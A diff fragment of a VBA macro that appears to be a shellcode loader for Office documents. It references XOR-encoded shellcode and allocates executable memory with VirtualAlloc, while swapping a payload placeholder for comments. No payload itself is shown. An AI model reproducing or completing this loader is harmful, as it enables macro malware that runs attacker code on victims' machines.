@@ -27,7 +27,10 @@ Sub NTj()
     End If
     
     ' Shellcode encoded with XOR with key 0xfa/250 (output from C# helper tool)
-    buf = Array(PAYLOAD)
+    'ShellCode
+    
+    'Caesar
+    'XOR
     
     ' Allocate memory space
     addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
